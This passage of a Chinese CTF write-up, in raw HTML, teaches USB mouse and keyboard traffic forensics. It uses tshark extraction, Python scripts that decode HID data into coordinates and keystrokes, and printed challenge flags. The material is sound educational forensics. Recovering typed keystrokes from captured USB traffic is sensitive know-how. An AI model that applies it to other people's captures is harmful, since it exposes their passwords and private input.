class="hljs-number">127</span>:<br>            offsetY -= <span class="hljs-number">256</span><br>        mousePositionX += offsetX<br>        mousePositionY += offsetY<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;01&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Left butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;LEFT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Right Butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;RIGHT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Move.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;MOVE&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print &quot;[-] Known operate.&quot;</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;ALL&quot;</span>:<br>            <span class="hljs-comment"># draw point to the image panel</span><br>            X.append(mousePositionX)<br>            Y.append(-mousePositionY)<br><br>    fig = plt.figure()<br>    ax1 = fig.add_subplot(<span class="hljs-number">111</span>)<br><br>    ax1.set_title(<span class="hljs-string">&#x27;[%s]-[%s] Author : WangYihang&#x27;</span> % (pcapFilePath, action))<br>    ax1.scatter(X, Y, c=<span class="hljs-string">&#x27;r&#x27;</span>, marker=<span class="hljs-string">&#x27;o&#x27;</span>)<br>    plt.show()<br><br>    <span class="hljs-comment"># clean temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>还有基于python3的<a href="https://github.com/WangYihang/UsbMiceDataHacker">UsbMiceDataHacker.py</a>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 UsbMiceDataHacker.py usb2.pcap RIGHT<br><span class="hljs-comment">#RIGHT代表右键</span><br></code></pre></td></tr></table></figure><p>我这里什么也没有<br><img src="https://img-blog.csdnimg.cn/20210412170000487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>贴上其他人成功的结果<br><img src="https://img-blog.csdnimg.cn/20210405124259780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法2：<br>提取鼠标流量数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt<br><img src="https://img-blog.csdnimg.cn/20210405124552237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行，亲身经历，这步很重要，包含空行会得到错误结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>没有冒号，使用脚本添加冒号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">fi</span>=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> 1:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==8: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(a),2):<br>                <span class="hljs-keyword">if</span> i+2 != len(a):<br>                    out+=a[i]+a[i+1]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+1]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p>运行脚本，得到out.txt<br><img src="https://img-blog.csdnimg.cn/20210405125011771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用mouse.py脚本，通过更改btn_flag的值来测试鼠标左右键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">2</span> : <span class="hljs-comment"># 1 代表左键</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>经过测试是鼠标右键流量，在生成的xy.txt中可以得到坐标：<br><img src="https://img-blog.csdnimg.cn/20210412192227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看了<a href="https://blog.csdn.net/qq_45555226/article/details/102810474">大师傅的wp</a>，发现我们添加冒号得到的内容不一样</p><p><img src="https://img-blog.csdnimg.cn/20210412162949750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>大师傅直接提取鼠标流量，含有冒号，而我提取出来的不含冒号，是Wireshark版本不同的缘故，在网上找到老版本的Wireshark</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Wireshark-win64-2.4.3<br>https://pan.baidu.com/s/1nvIIKpr<br>密码：5uao<br></code></pre></td></tr></table></figure><p>提取流量得到usbdata.txt,包含冒号：<img src="https://img-blog.csdnimg.cn/20210412163509262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用上面的mouse.py脚本，即可得到xy.txt。<br><img src="https://img-blog.csdnimg.cn/20210412164602929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入gnuplot工具，把xy.txt文本里的坐标转化为图片<br><img src="https://img-blog.csdnimg.cn/20210412165000484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>翻转一下图片<br><img src="https://img-blog.csdnimg.cn/20210412165426744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">XNCA&#123;U2BPCAPCETEVERYTHING&#125;<br></code></pre></td></tr></table></figure><p>也可以利用python脚本画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27; &#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210412200559583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。</p><p>击键信息集中在第3个字节，每次击键都会产生一个数据包。</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">参考文档</a>：USB keyboard映射表<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="实战练习-1"><a href="#实战练习-1" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag信息一般隐藏在USB流量中，通过USB协议数据中的键盘键码转换成键位。</p><p><strong>题目1：</strong><br>分析流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p>usbdata.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现提取出来包含空行，使用命令剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt空余行消失<br><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code></p><p>可以利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在网上找到两个键盘流量脚本</p><p>keyboard1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard.py                 <br>output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>keyboard2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span 